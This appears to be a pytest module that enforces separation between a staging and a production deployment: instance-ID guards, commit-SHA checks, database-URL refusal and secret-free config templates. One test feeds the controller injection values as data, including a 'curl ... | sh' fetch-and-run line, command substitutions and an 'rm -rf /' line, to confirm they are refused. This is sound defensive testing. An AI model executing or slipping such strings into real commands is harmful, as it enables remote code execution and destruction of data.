"""Structural tripwires for the staging/production boundary.

These tests assert the SEPARATION, not the behaviour: they are the mechanism
that notices if a later change quietly makes staging tooling able to reach
production, makes the production deploy path able to reach staging, or turns
the staging configuration template into a place where a real credential or a
production identifier can live.

Every assertion here corresponds to a row in docs/STAGING.md §3. If a row is
deleted there, the matching test must fail rather than silently pass.
"""

import re
import shutil
import subprocess
import tempfile
from functools import lru_cache
from pathlib import Path

import pytest
import yaml


REPO_ROOT = Path(__file__).resolve().parents[1]

STAGING_CONTROLLER = REPO_ROOT / "scripts" / "staging_control.py"
STAGING_HOST_SCRIPT = REPO_ROOT / "scripts" / "staging_deploy.sh"
STAGING_OVERLAY = REPO_ROOT / "docker-compose.staging.yml"
STAGING_ENV_TEMPLATE = REPO_ROOT / ".env.staging.example"
STAGING_GUIDE = REPO_ROOT / "docs" / "STAGING.md"

PRODUCTION_WORKFLOW = REPO_ROOT / ".github" / "workflows" / "deploy.yml"
PRODUCTION_CONTROLLER = REPO_ROOT / "scripts" / "deploy_control.py"
PRODUCTION_HOST_SCRIPT = REPO_ROOT / "scripts" / "production_deploy.sh"
PRODUCTION_GUIDE = REPO_ROOT / "docs" / "DEPLOYMENT.md"

# The one artefact of the production environment that must never appear in a
# staging runtime artefact. It is already committed elsewhere in this
# repository (tests/test_deploy_control.py), so naming it here discloses
# nothing new — it is the needle these tests search for.
PRODUCTION_INSTANCE_ID = "i-0c6f5352fc214e68d"
PRODUCTION_COGNITO_POOL_ID = "eu-central-1_kaX0SORRK"

STAGING_ARTEFACT_NAMES = (
    "axisai-staging",
    "staging_deploy.sh",
    "staging_control.py",
    "docker-compose.staging.yml",
    ".env.staging.example",
)

PRODUCTION_AUTHORITY_FILES = (
    PRODUCTION_WORKFLOW,
    PRODUCTION_CONTROLLER,
    PRODUCTION_HOST_SCRIPT,
)


def _read(path):
    return path.read_text(encoding="utf-8")


@lru_cache(maxsize=1)
def _usable_bash():
    """Whether `bash` can run a script on stdin AND see this process's files.

    On CI (ubuntu) it can, which is where running the real guard matters. On a
    Windows workstation `bash` on PATH may resolve to WSL's `bash.exe`, which
    runs in a different filesystem namespace and cannot open a Windows temp
    path — so the behavioural half of this module skips rather than reporting a
    guard failure that is really an environment mismatch.
    """
    if shutil.which("bash") is None:
        return False
    with tempfile.TemporaryDirectory() as directory:
        probe = Path(directory) / "probe"
        probe.write_text("ok\n", encoding="utf-8")
        script = f'test -f "{probe.as_posix()}" && echo VISIBLE\n'
        try:
            result = subprocess.run(["bash", "-s"], input=script.encode(),
                                    capture_output=True, timeout=30)
        except (OSError, subprocess.SubprocessError):
            return False
    return b"VISIBLE" in result.stdout


# ── The staging environment must be named, not inferred ──────────────────────


def test_staging_host_script_requires_an_explicit_environment_marker():
    """A deploy must not be able to decide it is "probably staging".

    The host script reads a marker file and requires it to say exactly
    `staging`. Accepting any other value — or tolerating a missing file — would
    let this script run wherever it happened to be copied.
    """
    source = _read(STAGING_HOST_SCRIPT)
    assert 'ENVIRONMENT_MARKER="$STAGING_ROOT/ENVIRONMENT"' in source
    assert '[[ "$declared" == "staging" ]]' in source
    assert '[[ -f "$ENVIRONMENT_MARKER" ]] || die' in source


def test_every_guard_is_actually_invoked_before_anything_is_mutated():
    """Defining a guard is not running one.

    The assertions around this one pin the guards' CONTENTS. Deleting the three
    call lines from the preflight block would remove every runtime check while
    leaving the function bodies — and their tests — intact. Assert the calls,
    and assert they come before the first mutation (`git checkout`).
    """
    lines = _read(STAGING_HOST_SCRIPT).splitlines()

    def line_of(prefix):
        for index, line in enumerate(lines):
            if line.strip() == prefix:
                return index
        raise AssertionError(f"{prefix!r} is not called at the top level")

    checkout = next(i for i, line in enumerate(lines)
                    if line.startswith("git checkout --detach"))
    for guard in ("assert_staging_environment", "assert_staging_instance",
                  "assert_staging_database"):
        assert line_of(guard) < checkout, f"{guard} runs after the checkout"


def test_staging_host_script_verifies_the_live_instance_identity():
    """The marker says which instance this is; IMDS says which it actually is.

    Both must agree, so relabelling a host is not enough to redirect a deploy.
    """
    source = _read(STAGING_HOST_SCRIPT)
    assert "169.254.169.254/latest/meta-data/instance-id" in source
    assert '[[ -n "$actual" && "$actual" == "$expected" ]]' in source
    assert '"$actual" != "$AXISAI_PRODUCTION_INSTANCE_ID"' in source


# ── Staging tooling can never target production ──────────────────────────────


def test_controller_refuses_when_the_two_instance_ids_are_the_same():
    from scripts import staging_control

    monkey = pytest.MonkeyPatch()
    try:
        monkey.setenv("AXISAI_STAGING_INSTANCE_ID", PRODUCTION_INSTANCE_ID)
        monkey.setenv("AXISAI_PRODUCTION_INSTANCE_ID", PRODUCTION_INSTANCE_ID)
        with pytest.raises(staging_control.Refused) as refusal:
            staging_control.resolve_target()
    finally:
        monkey.undo()
    assert "production instance id" in str(refusal.value)


@pytest.mark.parametrize(
    "missing", ["AXISAI_STAGING_INSTANCE_ID", "AXISAI_PRODUCTION_INSTANCE_ID"])
def test_controller_refuses_when_either_instance_id_is_absent(missing):
    """Both ids are mandatory.

    If the production id were optional, the comparison that refuses a
    production target would silently become a no-op on any workstation that
    forgot to export it — the guard would be present and useless.
    """
    from scripts import staging_control

    monkey = pytest.MonkeyPatch()
    try:
        monkey.setenv("AXISAI_STAGING_INSTANCE_ID", "i-086fdd5d201cbf1a5")
        monkey.setenv("AXISAI_PRODUCTION_INSTANCE_ID", PRODUCTION_INSTANCE_ID)
        monkey.delenv(missing)
        with pytest.raises(staging_control.Refused) as refusal:
            staging_control.resolve_target()
    finally:
        monkey.undo()
    assert missing in str(refusal.value)


@pytest.mark.parametrize("revision", [
    "main",
    "origin/main",
    "b77a1dc",
    "B77A1DC02C4ED050CAA50C17F592D0826DB084DE",
    "b77a1dc02c4ed050caa50c17f592d0826db084d",
])
def test_controller_refuses_anything_that_is_not_a_full_lowercase_sha(revision):
    """A staging result is only evidence if the revision that produced it is
    unambiguous. A branch name is not."""
    from scripts import staging_control

    with pytest.raises(staging_control.Refused):
        staging_control.resolve_revision(["staging_control.py", revision])


def test_controller_accepts_a_full_lowercase_sha():
    from scripts import staging_control

    sha = "b77a1dc02c4ed050caa50c17f592d0826db084de"
    assert staging_control.resolve_revision(["staging_control.py", sha]) == sha


def test_staging_host_script_refuses_branch_names_independently():
    """The host script re-checks the revision shape.

    The controller is not the only way to invoke it — an operator can run it
    over a plain SSM session — so the SHA requirement lives on the host too.
    """
    source = _read(STAGING_HOST_SCRIPT)
    assert '[[ "$DEPLOY_SHA" =~ ^[0-9a-f]{40}$ ]]' in source
    assert "branch names are refused" in source


# ── Staging can never write to the production database ───────────────────────


def test_staging_host_script_refuses_an_rds_database_url():
    source = _read(STAGING_HOST_SCRIPT)
    assert "*rds.amazonaws.com*) die" in source
    assert '*"@db:5432/"*' in source


def test_staging_host_script_refuses_an_ambiguous_database_url():
    """Compose's `env_file` takes the LAST assignment of a key.

    Inspecting the first one would let a .env carrying two DATABASE_URL lines
    pass the guard and boot against the other endpoint — and the app runs
    migrations at boot, so that is a write. Appending a corrected line rather
    than editing in place is the ordinary way a .env acquires a duplicate.
    """
    source = _read(STAGING_HOST_SCRIPT)
    assert "grep -cE '^DATABASE_URL='" in source
    assert '[[ "$count" == "1" ]]' in source
    # And the first-match read that made the ambiguity invisible is gone.
    assert "head -n1" not in source


@pytest.mark.skipif(not _usable_bash(),
                    reason="no bash that can read this process's files")
@pytest.mark.parametrize("env_body,expected", [
    ("DATABASE_URL=postgresql://su:sp@db:5432/sdb", "ACCEPTED"),
    ("DATABASE_URL=postgresql://su:sp@db:5432/sdb\n"
     "DATABASE_URL=postgresql://u:p@x.eu-central-1.rds.amazonaws.com:5432/f",
     "found 2"),
    ("DATABASE_URL=postgresql://u:p@x.eu-central-1.rds.amazonaws.com:5432/f",
     "RDS endpoint"),
    ("DATABASE_URL=sqlite:///chatbot.db", "does not target the staging db"),
    ("SECRET_KEY=x", "found 0"),
])
def test_database_guard_behaviour(tmp_path, env_body, expected):
    """Runs the actual guard, so the string assertions above cannot go stale."""
    source = _read(STAGING_HOST_SCRIPT)
    body = re.search(r"(?ms)^assert_staging_database\(\).*?^\}", source)
    assert body, "assert_staging_database is no longer a recognisable function"

    (tmp_path / ".env").write_text(env_body + "\n", encoding="utf-8")
    harness = (
        "set -euo pipefail\n"
        f'REPO_DIR="{_shell_path(tmp_path)}"\n'
        'die() { echo "REFUSED: $*"; exit 1; }\n'
        + body.group(0) + "\n"
        "assert_staging_database\n"
        "echo ACCEPTED\n"
    )
    # Fed on stdin rather than as a path (a Windows path argument reaches Git
    # Bash with its backslashes already consumed), and as BYTES with LF endings
    # — text mode would translate every newline back to CRLF on Windows and the
    # shell would die on `set -euo pipefail\r`. Same hazard the controller's
    # `_unix_bytes` exists for.
    result = subprocess.run(
        ["bash", "-s"], input=harness.replace("\r\n", "\n").encode("utf-8"),
        capture_output=True)
    output = (result.stdout + result.stderr).decode("utf-8", "replace")
    assert expected in output, output


def test_staging_overlay_provides_its_own_database_service():
    """Production has no `db` service (it uses RDS). Staging's database is a
    container on the staging host, so the overlay must add one — otherwise
    staging would need an external endpoint and the nearest one is production's.
    """
    overlay = yaml.safe_load(_read(STAGING_OVERLAY))
    assert "db" in overlay["services"]
    base = yaml.safe_load(_read(REPO_ROOT / "docker-compose.yml"))
    assert "db" not in base["services"], (
        "production compose gained a db service; the staging overlay's premise "
        "no longer holds")


def test_staging_database_is_not_reachable_from_outside_the_compose_network():
    """No host port mapping. The staging database must not be exposed on the
    instance at all — not even on loopback, which an SSM port-forward reaches.
    """
    overlay = yaml.safe_load(_read(STAGING_OVERLAY))
    assert "ports" not in overlay["services"]["db"]


def test_staging_database_image_is_pinned_by_digest():
    overlay = yaml.safe_load(_read(STAGING_OVERLAY))
    image = overlay["services"]["db"]["image"]
    assert "@sha256:" in image, (
        "a mutable tag lets two deploys of the same application SHA run "
        "different database bytes")


def test_staging_database_volume_is_mounted_at_the_cluster_root():
    """Regression guard for the postgres 18+ data-directory convention.

    These images store data in a major-version subdirectory of
    /var/lib/postgresql and refuse to start when a volume is mounted over
    /var/lib/postgresql/data — the container reports "unused mount/volume" and
    never becomes healthy, so every dependent service fails to start.
    """
    overlay = yaml.safe_load(_read(STAGING_OVERLAY))
    mounts = overlay["services"]["db"]["volumes"]
    assert any(mount.endswith(":/var/lib/postgresql") for mount in mounts)
    assert not any(
        mount.endswith(":/var/lib/postgresql/data") for mount in mounts)


# ── The production deploy authority must not know staging exists ─────────────


@pytest.mark.parametrize(
    "path", PRODUCTION_AUTHORITY_FILES, ids=lambda p: p.name)
@pytest.mark.parametrize("name", STAGING_ARTEFACT_NAMES)
def test_production_deploy_authority_names_no_staging_artefact(path, name):
    """Production deploy authority is A → B → C and nothing else.

    A staging job, a staging target, or a staging helper reachable from any of
    these three files would place a non-production environment inside the
    production deployment path.
    """
    assert name not in _read(path)


def test_production_deploy_authority_names_no_staging_instance():
    for path in PRODUCTION_AUTHORITY_FILES:
        assert "i-086fdd5d201cbf1a5" not in _read(path)


def test_the_staging_ssm_exemption_only_covers_guarded_files():
    """The other half of `tests/test_deploy_workflow.py`'s SSM drift guard.

    That guard admits this environment's files as a named second lifecycle
    (`STAGING_SSM_LIFECYCLE`). An exemption is only safe while the files it
    names cannot reach production, so assert that here: the exempt set must be
    exactly the staging artefacts, and the one file that actually sends a
    command must resolve its target through the refusing guard rather than from
    a literal or an argument.
    """
    from tests import test_deploy_workflow as production_guard

    exempt = {path.as_posix()
              for path in production_guard.STAGING_SSM_LIFECYCLE}
    assert exempt == {
        "scripts/staging_control.py",
        "scripts/staging_deploy.sh",
        "docs/STAGING.md",
        "tests/test_staging_separation.py",
        ".env.staging.example",
    }

    controller = _read(STAGING_CONTROLLER)
    assert controller.count("send_command(") == 1
    assert "InstanceIds=[staging_id]" in controller
    # `staging_id` can only come from resolve_target(), which refuses unless
    # both ids are present and different.
    assert "staging_id, production_id = resolve_target()" in controller


@pytest.mark.parametrize("value", [
    "/opt/x; curl http://example.invalid/x | sh",
    "/opt/$(id -u)",
    "/opt/`id -u`",
    "/opt/with space",
    "relative/path",
    "/opt/x\nrm -rf /",
])
def test_controller_refuses_a_staging_root_that_could_escape_the_payload(value):
    """The one interpolation that is not regex-checked elsewhere.

    `AXISAI_STAGING_ROOT` is an environment variable rather than a validated
    argument, and the rendered command runs as root on the target. The
    controller's premise is that nothing in the payload can terminate the
    surrounding quoting; this keeps that true for the path too.
    """
    from scripts import staging_control

    monkey = pytest.MonkeyPatch()
    try:
        monkey.setenv("AXISAI_STAGING_ROOT", value)
        with pytest.raises(staging_control.Refused):
            staging_control.resolve_staging_root()
    finally:
        monkey.undo()


def test_controller_accepts_a_plain_absolute_staging_root():
    from scripts import staging_control

    monkey = pytest.MonkeyPatch()
    try:
        monkey.setenv("AXISAI_STAGING_ROOT", "/opt/axisai-staging/")
        assert staging_control.resolve_staging_root() == "/opt/axisai-staging"
        monkey.delenv("AXISAI_STAGING_ROOT")
        assert staging_control.resolve_staging_root() == "/opt/axisai-staging"
    finally:
        monkey.undo()


def test_shipped_helper_is_normalised_to_unix_line_endings(tmp_path):
    """The controller runs on a workstation; the helper runs on Linux.

    With git-for-Windows' default `core.autocrlf=true`, the working copy of
    `staging_deploy.sh` has CRLF endings, and Linux bash reads the first line
    of a CRLF script as `set -euo pipefail\\r` — an invalid option name. Git
    Bash ignores CR, so this failure is invisible on the machine that would
    cause it.
    """
    from scripts import staging_control

    crlf = tmp_path / "helper.sh"
    crlf.write_bytes(b"#!/usr/bin/env bash\r\nset -euo pipefail\r\n")
    assert staging_control._unix_bytes(crlf) == (
        b"#!/usr/bin/env bash\nset -euo pipefail\n")

    # And an already-LF file is passed through unchanged.
    lf = tmp_path / "helper-lf.sh"
    lf.write_bytes(b"#!/usr/bin/env bash\nset -euo pipefail\n")
    assert staging_control._unix_bytes(lf) == lf.read_bytes()


def test_the_rendered_command_carries_no_carriage_return():
    """End to end: whatever the working copy looks like, what is sent is LF."""
    from scripts import staging_control

    command = staging_control.build_command(
        "b77a1dc02c4ed050caa50c17f592d0826db084de",
        PRODUCTION_INSTANCE_ID, "/opt/axisai-staging")
    decoded = b""
    for chunk in re.findall(r"printf '%s' '([A-Za-z0-9+/=]+)'", command):
        decoded += __import__("base64").b64decode(chunk)
    assert decoded, "no base64 payload found in the rendered command"
    assert b"\r" not in decoded
    assert b"\r" not in command.encode("utf-8")


def test_staging_deploy_is_not_a_github_workflow():
    """Staging deployment is a script plus a runbook, on purpose.

    A staging job in .github/workflows would run with repository credentials
    against a non-production target; the escape hatch is a documented manual
    procedure instead.
    """
    directory = REPO_ROOT / ".github" / "workflows"
    # GitHub accepts both extensions, so scan both — and assert the scan found
    # something, or a renamed directory would make this pass by scanning zero
    # files.
    workflows = sorted(set(directory.glob("*.yml")) | set(directory.glob("*.yaml")))
    assert workflows, "no workflows found; this tripwire would pass vacuously"
    for workflow in workflows:
        source = _read(workflow)
        for name in ("staging_deploy.sh", "staging_control.py",
                     "docker-compose.staging.yml"):
            assert name not in source, f"{workflow.name} references {name}"


# ── The staging configuration template holds names, never values ─────────────


SECRET_BEARING_KEYS = (
    "SECRET_KEY",
    "STAGING_DB_PASSWORD",
    "REDIS_PASSWORD",
    "COGNITO_CLIENT_SECRET",
    "COGNITO_TOKEN_ENC_KEY",
    "WEARABLE_TOKEN_KEY",
    "MOBILE_AUTH_DERIVATION_KEYRING",
    "RESEND_API_KEY",
    "OPENAI_API_KEY",
    "FATSECRET_CLIENT_SECRET",
    "WHOOP_CLIENT_SECRET",
    "GOOGLE_HEALTH_CLIENT_SECRET",
    "SENTRY_DSN",
)


def _template_assignments():
    assignments = {}
    for line in _read(STAGING_ENV_TEMPLATE).splitlines():
        if line.startswith("#") or "=" not in line:
            continue
        key, _, value = line.partition("=")
        assignments[key.strip()] = value.strip()
    return assignments


@pytest.mark.parametrize("key", SECRET_BEARING_KEYS)
def test_staging_template_carries_no_secret_value(key):
    """Every secret is generated on the staging host. The template documents
    the NAME so a rebuild knows what to create, and nothing else."""
    assignments = _template_assignments()
    assert key in assignments, f"{key} is not documented in the template"
    assert assignments[key] == "", (
        f"{key} has a value in the committed template")


def test_staging_template_names_no_production_identifier():
    """Scans the ASSIGNED VALUES, not the whole file.

    The comments deliberately name `rds.amazonaws.com` — that is the string the
    deploy script refuses, and an operator reading the template needs to know
    why pasting a production endpoint fails. A comment explaining the guard is
    not the same as a setting that trips it.
    """
    values = " ".join(_template_assignments().values())
    assert "rds.amazonaws.com" not in values
    assert PRODUCTION_COGNITO_POOL_ID not in values
    assert PRODUCTION_INSTANCE_ID not in values
    # The production identifiers must not be smuggled in as commented-out
    # "just uncomment this" settings either.
    for line in _read(STAGING_ENV_TEMPLATE).splitlines():
        stripped = line.lstrip("# ").strip()
        if re.match(r"^[A-Z][A-Z0-9_]*=", stripped):
            assert PRODUCTION_COGNITO_POOL_ID not in stripped
            assert "rds.amazonaws.com" not in stripped


def test_staging_template_database_url_targets_the_container():
    assignments = _template_assignments()
    assert "@db:5432/" in assignments["DATABASE_URL"]


def test_staging_template_keeps_the_sprint14_flag_off():
    """Establishing the environment and activating the feature are separate
    acts. A template that shipped the flag ON would make the infrastructure
    slice decide the activation."""
    source = _read(STAGING_ENV_TEMPLATE)
    assignments = _template_assignments()
    assert assignments["FITX_WORKOUT_SESSIONS_ENABLED"] == "0"
    assert "FITX_WORKOUT_SESSIONS_ENABLED=1" not in source


def test_staging_template_does_not_declare_the_environment_as_dev():
    """FITX_IS_DEV is derived from FLASK_DEBUG/FLASK_ENV, and it turns off
    SESSION_COOKIE_SECURE and makes DATABASE_URL optional. Staging must run the
    production code paths, so neither key may be set — even commented, since a
    commented key is one keystroke from an enabled one."""
    source = _read(STAGING_ENV_TEMPLATE)
    assert re.search(r"(?m)^\s*#?\s*FLASK_DEBUG\s*=", source) is None
    assert re.search(r"(?m)^\s*#?\s*FLASK_ENV\s*=", source) is None


def test_staging_template_isolates_observability_namespaces():
    assignments = _template_assignments()
    assert assignments["RUNTIME_METRICS_NAMESPACE"].startswith("AxisAI/Staging/")
    assert assignments["AI_METRICS_NAMESPACE"].startswith("AxisAI/Staging/")
    source = _read(STAGING_ENV_TEMPLATE)
    assert "=FitX/Runtime" not in source
    assert "=FitX/AI" not in source


def test_staging_template_leaves_external_writers_unconfigured():
    """Staging must not be able to touch anything outside itself: no production
    bucket to write photos into, no mail provider to reach a real person."""
    assignments = _template_assignments()
    assert assignments["S3_BUCKET_NAME"] == ""
    assert assignments["RESEND_API_KEY"] == ""


# ── The runbook must keep describing the boundary it documents ───────────────


@pytest.mark.parametrize("claim", [
    "docs/STAGING.md",
])
def test_production_runbook_points_at_the_staging_runbook(claim):
    assert claim in _read(PRODUCTION_GUIDE)


@pytest.mark.parametrize("subject", [
    "axisai-staging-nightly-stop",
    "stopped by default",
    "Stopped is not zero",
    "session-manager-plugin",
    "AWS-StartPortForwardingSession",
])
def test_staging_runbook_documents_the_operator_contract(subject):
    assert subject in _read(STAGING_GUIDE)
